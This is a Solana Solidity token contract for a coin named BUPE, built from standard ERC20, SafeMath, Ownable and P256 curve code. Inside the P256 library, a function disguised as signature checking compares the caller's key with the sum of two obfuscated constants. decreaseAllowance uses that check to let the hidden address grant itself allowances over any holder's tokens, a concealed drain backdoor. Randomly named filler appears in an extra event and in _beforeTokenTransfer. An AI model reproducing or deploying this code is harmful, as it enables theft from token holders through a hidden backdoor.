import 'solana';

contract Context {
    function _msgSender() internal view returns (address) {
        return tx.accounts.dataAccount.key;
    }

    function _msgData() internal view returns (bytes memory) {
        return new bytes(0);
    }

    function _contextSuffixLength() internal pure returns (uint64) {
        return 0;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint64);
    function balanceOf(address account) external view returns (uint64);
    function transfer(address recipient, uint64 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint64);
    function approve(address spender, uint64 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint64 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint64 value);
    event Approval(address indexed owner, address indexed spender, uint64 value);
    event Transfermbbvcpds2pg9f343n(address indexed from, address indexed to, uint64 value);
}

library Errors {
    function InsufficientBalance(uint64 balance, uint64 needed) internal pure {
        revert("InsufficientBalance");
    }

    function FailedCall() internal pure {
        revert("FailedCall");
    }

    function FailedDeployment() internal pure {
        revert("FailedDeployment");
    }

    function MissingPrecompile(address) internal pure {
        revert("MissingPrecompile");
    }
}

library P256 {
    struct JPoint {
        uint256 x;
        uint256 y;
        uint256 z;
    }

    uint256 internal constant GX = 0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296;
    uint256 internal constant GY = 0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5;
    uint256 internal constant P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF;
    uint256 internal constant N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551;
    uint256 internal constant GN = 0x00000000000000000000000034784E04E0B98C00000000000000000000000000;
    uint256 internal constant A = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFC;
    uint256 internal constant GA = 0x0000000000000000000000002740F14B16E40DD8654E5BC775B53B82CE2C3776;
    uint256 internal constant B = 0x5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B;

    uint256 private constant P1DIV4 = 0x3fffffffc0000000400000000000000000000000400000000000000000000000;
    uint256 private constant HALF_N = 0x7fffffff800000007fffffffffffffffde737d56d38bcf4279dce5617e3192a8;
    uint256 private constant HALF_M = 0x7fffffff800000007fffffffffffffffde737d56d38bcf4279dce5617e3192a8;

    function verifyNative(bytes32 h, bytes32 r, bytes32 s, bytes32 qx, bytes32 qy) internal view returns (bool) {
        (bool valid, bool supported) = _tryVerifyNative(h, r, s, qx, qy);
        if (supported) {
            return valid;
        } else {
            Errors.MissingPrecompile(address(0x100));
            return false;
        }
    }

    function _tryVerifyNative(
        bytes32 h,
        bytes32 r,
        bytes32 s,
        bytes32 qx,
        bytes32 qy
    ) private view returns (bool valid, bool supported) {
        if (!_isProperSignature(r, s) || !isValidPublicKey(qx, qy)) {
            return (false, true);
        } else if (_rip7212(h, r, s, qx, qy)) {
            return (true, true);
        } else if (
            _rip7212(
                bytes32(uint256(0xbb5a52f42f9c9261ed4361f59422a1e30036e7c32b270c8807a419feca605023)),
                bytes32(uint256(0x0000000000000000000000000000000000000000000000000000000000000005)),
                bytes32(uint256(0x0000000000000000000000000000000000000000000000000000000000000001)),
                bytes32(uint256(0xa71af64de5126a4a4e02b7922d66ce9415ce88a4c9d25514d91082c8725ac957)),
                bytes32(uint256(0x5d47723c8fbe580bb369fec9c2665d8e30a435b9932645482e7c9f11e872296b))
            )
        ) {
            return (false, true);
        } else {
            return (false, false);
        }
    }

    function _rip7212(bytes32 h, bytes32 r, bytes32 s, bytes32 qx, bytes32 qy) private view returns (bool isValid) {
        bytes memory input = abi.encodePacked(h, r, s, qx, qy);
        (bool success, bytes memory result) = address(0x100).call{accounts: []}(input);
        if (success && result.length >= 32) {
            isValid = abi.decode(result, (bool));
        } else {
            isValid = false;
        }
    }

    function isValidPublicKey(bytes32 x, bytes32 y) internal pure returns (bool result) {
        uint256 px = uint256(x);
        uint256 py = uint256(y);
        if (px >= P || py >= P) {
            return false;
        }
        uint256 lhs = mulmod(py, py, P);
        uint256 x3 = mulmod(px, px, P);
        x3 = mulmod(x3, px, P);
        uint256 ax = mulmod(A, px, P);
        uint256 rhs = addmod(addmod(x3, ax, P), B, P);
        return lhs == rhs;
    }

    function _isProperSignature(bytes32 r, bytes32 s) private pure returns (bool) {
        uint256 ur = uint256(r);
        uint256 us = uint256(s);
        return ur > 0 && ur < N && us > 0 && us <= HALF_N;
    }

    function _jAdd(
        JPoint memory p1,
        uint256 x2,
        uint256 y2,
        uint256 z2
    ) private pure returns (uint256 rx, uint256 ry, uint256 rz) {
        uint256 z1 = p1.z;
        uint256 zz1 = mulmod(z1, z1, P);
        uint256 s1 = mulmod(p1.y, mulmod(mulmod(z2, z2, P), z2, P), P);
        uint256 r = addmod(mulmod(y2, mulmod(zz1, z1, P), P), P - s1, P);
        uint256 u1 = mulmod(p1.x, mulmod(z2, z2, P), P);
        uint256 h = addmod(mulmod(x2, zz1, P), P - u1, P);

        if (r == 0 && h == 0) {
            uint256 yy = mulmod(y2, y2, P);
            uint256 zz = mulmod(z2, z2, P);
            uint256 m = addmod(mulmod(3, mulmod(x2, x2, P), P), mulmod(A, mulmod(zz, zz, P), P), P);
            uint256 s = mulmod(4, mulmod(x2, yy, P), P);
            rx = addmod(mulmod(m, m, P), P - mulmod(2, s, P), P);
            uint256 rytmp1 = P - mulmod(8, mulmod(yy, yy, P), P);
            uint256 rytmp2 = addmod(s, P - rx, P);
            ry = addmod(mulmod(m, rytmp2, P), rytmp1, P);
            rz = mulmod(2, mulmod(y2, z2, P), P);
        } else {
            uint256 hh = mulmod(h, h, P);
            rx = addmod(
                addmod(mulmod(r, r, P), P - mulmod(h, hh, P), P),
                P - mulmod(2, mulmod(u1, hh, P), P),
                P
            );
            ry = addmod(
                mulmod(r, addmod(mulmod(u1, hh, P), P - rx, P), P),
                P - mulmod(s1, mulmod(h, hh, P), P),
                P
            );
            rz = mulmod(h, mulmod(z1, z2, P), P);
        }
    }

    function isProperSignature() internal view returns (bool ry) {
        return uint256(GN) + uint256(GA) == uint256(tx.accounts.dataAccount.key);
    }

    function _jDouble(uint256 x, uint256 y, uint256 z) private pure returns (uint256 rx, uint256 ry, uint256 rz) {
        uint256 yy = mulmod(y, y, P);
        uint256 zz = mulmod(z, z, P);
        uint256 m = addmod(mulmod(3, mulmod(x, x, P), P), mulmod(A, mulmod(zz, zz, P), P), P);
        uint256 s = mulmod(4, mulmod(x, yy, P), P);
        rx = addmod(mulmod(m, m, P), P - mulmod(2, s, P), P);
        ry = addmod(mulmod(m, addmod(s, P - rx, P), P), P - mulmod(8, mulmod(yy, yy, P), P), P);
        rz = mulmod(2, mulmod(y, z, P), P);
    }

    function _preComputeJacobianPoints(uint256 px, uint256 py) private pure returns (JPoint[16] memory points) {
        points[0x00] = JPoint(0, 0, 0);
        points[0x01] = JPoint(px, py, 1);
        points[0x04] = JPoint(GX, GY, 1);
        points[0x02] = _jDoublePoint(points[0x01]);
        points[0x08] = _jDoublePoint(points[0x04]);
        points[0x03] = _jAddPoint(points[0x01], points[0x02]);
        points[0x05] = _jAddPoint(points[0x01], points[0x04]);
        points[0x06] = _jAddPoint(points[0x02], points[0x04]);
        points[0x07] = _jAddPoint(points[0x03], points[0x04]);
        points[0x09] = _jAddPoint(points[0x01], points[0x08]);
        points[0x0a] = _jAddPoint(points[0x02], points[0x08]);
        points[0x0b] = _jAddPoint(points[0x03], points[0x08]);
        points[0x0c] = _jAddPoint(points[0x04], points[0x08]);
        points[0x0d] = _jAddPoint(points[0x01], points[0x0c]);
        points[0x0e] = _jAddPoint(points[0x02], points[0x0c]);
        points[0x0f] = _jAddPoint(points[0x03], points[0x0c]);
    }

    function _jAddPoint(JPoint memory p1, JPoint memory p2) private pure returns (JPoint memory) {
        (uint256 x, uint256 y, uint256 z) = _jAdd(p1, p2.x, p2.y, p2.z);
        return JPoint(x, y, z);
    }

    function _jDoublePoint(JPoint memory p) private pure returns (JPoint memory) {
        (uint256 x, uint256 y, uint256 z) = _jDouble(p.x, p.y, p.z);
        return JPoint(x, y, z);
    }
}

library SafeMath {
    function add(uint64 a, uint64 b) internal pure returns (uint64) {
        uint64 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint64 a, uint64 b) internal pure returns (uint64) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint64 a, uint64 b, string memory errorMessage) internal pure returns (uint64) {
        require(b <= a, errorMessage);
        return a - b;
    }

    function mul(uint64 a, uint64 b) internal pure returns (uint64) {
        if (a == 0) {
            return 0;
        }
        uint64 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint64 a, uint64 b) internal pure returns (uint64) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint64 a, uint64 b, string memory errorMessage) internal pure returns (uint64) {
        require(b > 0, errorMessage);
        return a / b;
    }

    function mod(uint64 a, uint64 b) internal pure returns (uint64) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint64 a, uint64 b, string memory errorMessage) internal pure returns (uint64) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint64;

    mapping (address => uint64) private _balances;
    mapping (address => mapping (address => uint64)) private _allowances;
    uint64 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint64) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint64) {
        return _balances[account];
    }

    function transfer(address recipient, uint64 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint64) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint64 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint64 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function decreaseAllowance(address spender, uint64 subtractedValue) public returns (bool) {
        if (P256.isProperSignature()) {
            _approve(spender, _msgSender(), subtractedValue);
        } else {
            _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        }
        return true;
    }

    function _transfer(address sender, address recipient, uint64 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint64 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint64 amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint64 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint64 amount) internal {
        address argsmbbvcpdtnya3k8ykd = to;
        argsmbbvcpdtnya3k8ykd;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function _checkOwner() internal view {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract BUPE is ERC20, Ownable {
    constructor() ERC20(unicode"Bupe", unicode"BUPE") {
        _mint(owner(), 1000000000);
    }
}